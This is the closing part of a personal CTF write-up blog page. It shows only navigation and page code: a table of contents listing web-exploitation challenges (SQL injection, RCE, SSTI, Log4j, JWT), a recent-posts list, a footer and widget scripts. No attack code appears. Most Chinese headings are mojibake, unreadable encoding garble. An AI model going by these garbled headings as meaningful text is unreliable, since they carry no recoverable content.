class="toc-number">2.</span> <span class="toc-text">Basectf [Week4] No JWT</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B5%99%E6%B1%9F%E7%9C%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%A3%E4%BC%A0%E6%B4%B2%E9%99%85%E5%8F%B0%E5%B7%9E%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%A3%E4%BC%A0%E5%91%A8%E4%B8%8D%E7%9F%A5%E9%81%93%E4%BB%80%E4%B9%88sql%E9%A2%98"><span class="toc-number">3.</span> <span class="toc-text">æµ™æ±Ÿçœç½‘ç»œå®‰å…¨å®£ä¼ æ´²é™…å°å·å¸‚ç½‘ç»œå®‰å…¨å®£ä¼ å‘¨ä¸çŸ¥é“ä»€ä¹ˆsqlé¢˜</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-1"><span class="toc-number">4.</span> <span class="toc-text">æ¯æ—¥ä¸€é¢˜</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ctfshow%E5%86%85%E9%83%A8%E8%B5%9B%E7%AD%BE%E5%88%B0-1"><span class="toc-number">4.1.</span> <span class="toc-text">ctfshowå†…éƒ¨èµ›ç­¾åˆ°</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web15-Fishman-1"><span class="toc-number">4.2.</span> <span class="toc-text">web15 Fishman</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2023-%E5%8D%8E%E5%8C%97-ez-date-1"><span class="toc-number">4.3.</span> <span class="toc-text">[CISCN 2023 ååŒ—]ez_date</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2023-%E5%8D%8E%E5%8C%97-pysym-1"><span class="toc-number">4.4.</span> <span class="toc-text">[CISCN 2023 ååŒ—]pysym</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2019%E5%8D%8E%E4%B8%9C%E5%8D%97-Web4-1"><span class="toc-number">4.5.</span> <span class="toc-text">[CISCN 2019åä¸œå—]Web4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%84%EF%BC%9AFlask-Session-Cookie-%E7%AE%A1%E7%90%86%E5%99%A8%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97-1"><span class="toc-number">4.5.1.</span> <span class="toc-text">é™„ï¼šFlask Session Cookie ç®¡ç†å™¨ä½¿ç”¨æŒ‡å—</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FSCTF-2023-%E7%AD%BE%E5%88%B0plus-1"><span class="toc-number">4.6.</span> <span class="toc-text">[FSCTF 2023]ç­¾åˆ°plus</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HNCTF-2022-Week1-Challenge-rce-1"><span class="toc-number">4.7.</span> <span class="toc-text">[HNCTF 2022 Week1]Challenge__rce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2023-%E8%A5%BF%E5%8D%97-do-you-like-read-1"><span class="toc-number">4.8.</span> <span class="toc-text">[CISCN 2023 è¥¿å—]do_you_like_read</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8-1"><span class="toc-number">4.9.</span> <span class="toc-text">[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%B9%A4%E5%9F%8E%E6%9D%AF-2021-EasyP-1"><span class="toc-number">4.10.</span> <span class="toc-text">[é¹¤åŸæ¯ 2021]EasyP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web3-%E8%8E%AB%E8%B4%9F%E5%A9%B5%E5%A8%9F-1"><span class="toc-number">4.11.</span> <span class="toc-text">web3_è«è´Ÿå©µå¨Ÿ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web2-%E6%95%85%E4%BA%BA%E5%BF%83-1"><span class="toc-number">4.12.</span> <span class="toc-text">web2_æ•…äººå¿ƒ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NISACTF-2022-join-us-1"><span class="toc-number">4.13.</span> <span class="toc-text">[NISACTF 2022]join-us</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MoeCTF-2022-ezphp-1"><span class="toc-number">4.14.</span> <span class="toc-text">[MoeCTF 2022]ezphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-EasyCleanup-1"><span class="toc-number">4.15.</span> <span class="toc-text">[ç¬¬äº”ç©ºé—´ 2021]EasyCleanup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FSCTF-2023-ez-php2-1"><span class="toc-number">4.16.</span> <span class="toc-text">[FSCTF 2023]ez_php2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SCTF-2021-loginme-1"><span class="toc-number">4.17.</span> <span class="toc-text">[SCTF 2021]loginme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-4-SWPU-ez-rce-1"><span class="toc-number">4.18.</span> <span class="toc-text">[NSSRound#4 SWPU]ez_rce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WUSTCTF-2020-CV-Maker-1"><span class="toc-number">4.19.</span> <span class="toc-text">[WUSTCTF 2020]CV Maker</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-1-Basic-basic-check-1"><span class="toc-number">4.20.</span> <span class="toc-text">[NSSRound#1 Basic]basic_check</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MoeCTF-2021-%E5%9C%B0%E7%8B%B1%E9%80%9A%E8%AE%AF-%E6%94%B9-1"><span class="toc-number">4.21.</span> <span class="toc-text">[MoeCTF 2021]åœ°ç‹±é€šè®¯-æ”¹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HZNUCTF-2023-final-eznode-1"><span class="toc-number">4.22.</span> <span class="toc-text">[HZNUCTF 2023 final]eznode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%AE%E6%A8%A1%E5%9D%97%E7%9A%84%E5%87%BD%E6%95%B0-1"><span class="toc-number">4.22.1.</span> <span class="toc-text">å†…ç½®æ¨¡å—çš„å‡½æ•°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Express%E6%A1%86%E6%9E%B6%E7%9B%B8%E5%85%B3%E7%9A%84%E5%87%BD%E6%95%B0-1"><span class="toc-number">4.22.2.</span> <span class="toc-text">Expressæ¡†æ¶ç›¸å…³çš„å‡½æ•°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0-1"><span class="toc-number">4.22.3.</span> <span class="toc-text">è‡ªå®šä¹‰å‡½æ•°</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-2022-real-ez-node-1"><span class="toc-number">4.23.</span> <span class="toc-text">[è¥¿æ¹–è®ºå‰‘ 2022]real_ez_node</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GFCTF-2021-ez-calc-1"><span class="toc-number">4.24.</span> <span class="toc-text">[GFCTF 2021]ez_calc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HDCTF-2023-YamiYami-1"><span class="toc-number">4.25.</span> <span class="toc-text">[HDCTF 2023]YamiYami</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FBCTF-2019-rceservice-1"><span class="toc-number">4.26.</span> <span class="toc-text">[FBCTF 2019]rceservice</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NISACTF-2022-bingdundun-1"><span class="toc-number">4.27.</span> <span class="toc-text">[NISACTF 2022]bingdundun~</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HUBUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-checkin-1"><span class="toc-number">4.28.</span> <span class="toc-text">[HUBUCTF 2022 æ–°ç”Ÿèµ›]checkin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HDCTF-2023-SearchMaster-1"><span class="toc-number">4.29.</span> <span class="toc-text">[HDCTF 2023]SearchMaster</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%87%E7%AD%BE%EF%BC%9A-1"><span class="toc-number">4.29.1.</span> <span class="toc-text">æ ‡ç­¾ï¼š</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-smarty-version-1"><span class="toc-number">4.29.1.1.</span> <span class="toc-text">1. {$smarty.version}</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-php-php-1"><span class="toc-number">4.29.1.2.</span> <span class="toc-text">2.{php}{&#x2F;php}</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-literal-1"><span class="toc-number">4.29.1.3.</span> <span class="toc-text">3.{literal}</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-if-if-1"><span class="toc-number">4.29.1.4.</span> <span class="toc-text">4.{if}{&#x2F;if}</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NCTF-2019-Fake-XML-cookbook-1"><span class="toc-number">4.30.</span> <span class="toc-text">[NCTF 2019]Fake XML cookbook</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HNCTF-2022-WEEK2-easy-unser-1"><span class="toc-number">4.31.</span> <span class="toc-text">[HNCTF 2022 WEEK2]easy_unser</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPUCTF-2023-%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B-RCE-PLUS-1"><span class="toc-number">4.32.</span> <span class="toc-text">[SWPUCTF 2023 ç§‹å­£æ–°ç”Ÿèµ›]RCE-PLUS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-yet-another-mysql-injection-1"><span class="toc-number">4.33.</span> <span class="toc-text">[ç¬¬äº”ç©ºé—´ 2021]yet_another_mysql_injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-13-Basic-flask-jwt-1"><span class="toc-number">4.34.</span> <span class="toc-text">[NSSRound#13 Basic]flask?jwt?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BB%E9%99%86%E5%B0%B1%E6%9C%89flag-1"><span class="toc-number">4.35.</span> <span class="toc-text">ç™»é™†å°±æœ‰flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Log4j%E5%A4%8D%E7%8E%B0-1"><span class="toc-number">4.36.</span> <span class="toc-text">Log4jå¤ç°</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BB%E5%89%91%E6%9D%AF-%E8%BF%91%E5%9C%A8%E7%9C%BC%E5%89%8D-1"><span class="toc-number">4.37.</span> <span class="toc-text">å‡»å‰‘æ¯-è¿‘åœ¨çœ¼å‰</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#render-template-string-%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86-1"><span class="toc-number">4.37.1.</span> <span class="toc-text">render_template_string çš„å·¥ä½œåŸç†</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%AF%BC%E8%87%B4-SSTI-%E6%BC%8F%E6%B4%9E-1"><span class="toc-number">4.37.2.</span> <span class="toc-text">å¦‚ä½•å¯¼è‡´ SSTI æ¼æ´</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD-1"><span class="toc-number">4.37.3.</span> <span class="toc-text">é˜²å¾¡æªæ–½</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90%EF%BC%9A-1"><span class="toc-number">4.37.4.</span> <span class="toc-text">ä¾‹å­ï¼š</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%95%E8%BA%AB%E6%9D%AFweb%E7%AD%BE%E5%88%B0-1"><span class="toc-number">4.38.</span> <span class="toc-text">å•èº«æ¯webç­¾åˆ°</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GHCTF-2024-PermissionDenied-1"><span class="toc-number">4.39.</span> <span class="toc-text">[GHCTF 2024]PermissionDenied</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%99%E4%BD%A0shell-1"><span class="toc-number">4.40.</span> <span class="toc-text">ç»™ä½ shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#moectf%E5%8B%87%E9%97%AF%E9%93%9C%E4%BA%BA%E9%98%B5-1"><span class="toc-number">4.41.</span> <span class="toc-text">moectfå‹‡é—¯é“œäººé˜µ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BASECTF-Week2-Really-EZ-POP-1"><span class="toc-number">4.42.</span> <span class="toc-text">BASECTF [Week2] Really EZ POP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BaseCTF-%E6%89%80%E4%BB%A5%E4%BD%A0%E8%AF%B4%E4%BD%A0%E6%87%82-MD5-1"><span class="toc-number">4.43.</span> <span class="toc-text">BaseCTF æ‰€ä»¥ä½ è¯´ä½ æ‡‚ MD5?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Basectf-Week4-flag%E7%9B%B4%E6%8E%A5%E8%AF%BB%E5%8F%96%E4%B8%8D%E5%B0%B1%E8%A1%8C%E4%BA%86%EF%BC%9F-1"><span class="toc-number">4.44.</span> <span class="toc-text">Basectf [Week4] flagç›´æ¥è¯»å–ä¸å°±è¡Œäº†ï¼Ÿ</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Basectf-Week4-No-JWT-1"><span class="toc-number">5.</span> <span class="toc-text">Basectf [Week4] No JWT</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B5%99%E6%B1%9F%E7%9C%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%A3%E4%BC%A0%E6%B4%B2%E9%99%85%E5%8F%B0%E5%B7%9E%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%A3%E4%BC%A0%E5%91%A8%E4%B8%8D%E7%9F%A5%E9%81%93%E4%BB%80%E4%B9%88sql%E9%A2%98-1"><span class="toc-number">6.</span> <span class="toc-text">æµ™æ±Ÿçœç½‘ç»œå®‰å…¨å®£ä¼ æ´²é™…å°å·å¸‚ç½‘ç»œå®‰å…¨å®£ä¼ å‘¨ä¸çŸ¥é“ä»€ä¹ˆsqlé¢˜</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#BaseCTF-%E5%A4%8D%E8%AF%BB%E6%9C%BA"><span class="toc-number">6.1.</span> <span class="toc-text">BaseCTF å¤è¯»æœº</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BaseCTF-%E6%BB%A4%E4%B8%AA%E4%B8%8D%E5%81%9C"><span class="toc-number">6.2.</span> <span class="toc-text">BaseCTF æ»¤ä¸ªä¸åœ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BaseCTF-EZ-PHP-Jail"><span class="toc-number">6.3.</span> <span class="toc-text">BaseCTF EZ_PHP_Jail</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World"><span class="toc-number">6.4.</span> <span class="toc-text">[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSCTF-Apache-log4j%E6%BC%8F%E6%B4%9E%E9%9D%B6%E6%9C%BA"><span class="toc-number">6.5.</span> <span class="toc-text">NSSCTF Apache log4jæ¼æ´é¶æœº</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BadProgrammer"><span class="toc-number">6.6.</span> <span class="toc-text">BadProgrammer</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2020-7699%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">6.6.1.</span> <span class="toc-text">CVE-2020-7699æ¼æ´åˆ†æ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math"><span class="toc-number">6.7.</span> <span class="toc-text">[CISCN 2019 åˆèµ›]Love Math</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%B8%80"><span class="toc-number">6.7.1.</span> <span class="toc-text">æ³•ä¸€</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C"><span class="toc-number">6.7.2.</span> <span class="toc-text">æ³•äºŒ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%B8%89"><span class="toc-number">6.7.3.</span> <span class="toc-text">æ³•ä¸‰</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XCTF-ics-05"><span class="toc-number">6.7.4.</span> <span class="toc-text">XCTF ics-05</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XCTF-Cat"><span class="toc-number">6.8.</span> <span class="toc-text">XCTF Cat</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>æœ€æ–°æ–‡ç« </span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/11/12/GHCTF2024/" title="GHCTF2024"><img src="https://www.dmoe.cc/random.php?1010" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="GHCTF2024"/></a><div class="content"><a class="title" href="/2024/11/12/GHCTF2024/" title="GHCTF2024">GHCTF2024</a><time datetime="2024-11-12T10:51:48.000Z" title="å‘è¡¨äº 2024-11-12 18:51:48">2024-11-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/11/CTFSHOW%E5%8D%95%E8%BA%AB%E6%9D%AF/" title="CTFSHOWå•èº«æ¯"><img src="https://www.dmoe.cc/random.php?3616" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTFSHOWå•èº«æ¯"/></a><div class="content"><a class="title" href="/2024/11/11/CTFSHOW%E5%8D%95%E8%BA%AB%E6%9D%AF/" title="CTFSHOWå•èº«æ¯">CTFSHOWå•èº«æ¯</a><time datetime="2024-11-11T07:03:39.000Z" title="å‘è¡¨äº 2024-11-11 15:03:39">2024-11-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/07/CTFSHOW1024%E6%9D%AF/" title="CTFSHOW1024æ¯"><img src="https://www.dmoe.cc/random.php?5753" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTFSHOW1024æ¯"/></a><div class="content"><a class="title" href="/2024/11/07/CTFSHOW1024%E6%9D%AF/" title="CTFSHOW1024æ¯">CTFSHOW1024æ¯</a><time datetime="2024-11-07T12:38:19.000Z" title="å‘è¡¨äº 2024-11-07 20:38:19">2024-11-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/06/XGCTF-%E8%A5%BF%E7%93%9C%E6%9D%AF/" title="XGCTF_è¥¿ç“œæ¯"><img src="https://www.dmoe.cc/random.php?9965" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="XGCTF_è¥¿ç“œæ¯"/></a><div class="content"><a class="title" href="/2024/11/06/XGCTF-%E8%A5%BF%E7%93%9C%E6%9D%AF/" title="XGCTF_è¥¿ç“œæ¯">XGCTF_è¥¿ç“œæ¯</a><time datetime="2024-11-06T11:30:40.000Z" title="å‘è¡¨äº 2024-11-06 19:30:40">2024-11-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/06/4-Tr0ll/" title="4-Tr0ll"><img src="https://www.dmoe.cc/random.php?242" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="4-Tr0ll"/></a><div class="content"><a class="title" href="/2024/11/06/4-Tr0ll/" title="4-Tr0ll">4-Tr0ll</a><time datetime="2024-11-06T09:53:08.000Z" title="å‘è¡¨äº 2024-11-06 17:53:08">2024-11-06</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 By yiyi</div><div class="framework-info"><span>æ¡†æ¶ </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>ä¸»é¢˜ </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">æ¬¢è¿å¸¸æ¥å–µ~</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="æµ…è‰²å’Œæ·±è‰²æ¨¡å¼è½¬æ¢"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="è®¾ç½®"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="ç›®å½•"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="ç›´è¾¾è¯„è®º"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'pYgEIy3e8aneCT2SHN7sYl1L-gzGzoHsz',
      appKey: 'V8vEx9nsiDEMy45ekCcPUaiN',
      avatar: 'monsterid',
      serverURLs: 'https://pygeiy3e.lc-cn-n1-shared.com',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: true
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.jsdelivr.net/npm/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="false"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="true"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="false" data-text="â¤ï¸,ğŸ©·,ğŸ§¡,ğŸ’›,ğŸ’š,ğŸ’™,ğŸ©µ,ğŸ’œ,ğŸ¤,ğŸ–¤,ğŸ©¶,ğŸ¤" data-fontsize="15px" data-random="random" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">æœç´¢</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  æ•°æ®åº“åŠ è½½ä¸­</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="æœç´¢æ–‡ç« " type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>